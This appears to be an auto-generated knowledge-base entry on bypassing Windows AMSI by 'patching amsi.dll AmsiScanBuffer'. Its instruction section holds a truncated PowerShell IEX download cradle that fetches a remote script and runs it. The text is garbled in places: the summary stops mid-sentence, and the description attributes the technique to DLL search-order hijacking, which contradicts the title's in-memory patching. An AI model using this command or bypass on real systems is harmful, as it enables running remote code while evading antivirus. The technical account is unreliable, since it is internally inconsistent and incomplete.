---
id: 5fddc468-9613-4dcb-94b1-9e16e4aa920f
name: Patching amsi.dll AmsiScanBuffer by rasta-mouse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:25.941092+00:00'
updated_at: '2023-04-10T20:36:18.306251+00:00'
tags:
- '[[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]'
- '[[The Short version of dont use powershell net webclient]]'
---

# Patching amsi.dll AmsiScanBuffer by rasta-mouse

## Summary

Patching amsi.dll AmsiScanBuffer is a technique used to bypass antivirus and other security measures. This technique involves hijacking the DLL search order of a targeted application and replacing the AmsiScanBuffer function with a malicious version. When the targeted application calls the AmsiScan

## Description

# Description

Patching amsi.dll AmsiScanBuffer is a technique used to bypass antivirus and other security measures. This technique involves hijacking the DLL search order of a targeted application and replacing the AmsiScanBuffer function with a malicious version. When the targeted application calls the AmsiScanBuffer function, it will execute the malicious code instead of the original function. This technique can be used to allow a malicious actor to execute code on a system undetected.

From a technical perspective, this technique involves identifying a vulnerable application that uses the AmsiScanBuffer function and hijacking the DLL search order to load a malicious DLL. The malicious DLL contains a modified version of the AmsiScanBuffer function that allows the attacker to execute code on the system.

The business value of this technique is that it allows attackers to bypass security measures and execute code on a system undetected, potentially allowing them to steal sensitive data or gain access to other systems on a network.

## Requirements

1. Access to a vulnerable application that uses the AmsiScanBuffer function

1. Ability to hijack the DLL search order of the targeted application

1. Ability to create a malicious DLL with a modified version of the AmsiScanBuffer function

## Defense

1. Regularly update and patch applications to prevent vulnerabilities that could be exploited by DLL search order hijacking

1. Use anti-malware software that can detect and block attempts to hijack DLL search order

1. Monitor system logs for suspicious activity related to DLL search order hijacking

## Objectives

1. To bypass antivirus and other security measures

1. To execute code on a system undetected

# Instructions

1. IEX

**Code**: [[IEX([Net.Webclient]::new().DownloadString("https:/]]

> The IEX (Invoke-Expression) command is used to execute a string as a command. In this case, the command downloads a script from a malicious URL and executes it on the system. This can result in the installation of malware or other malicious activities.

## Tags

- [[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]
- [[The Short version of dont use powershell net webclient]]
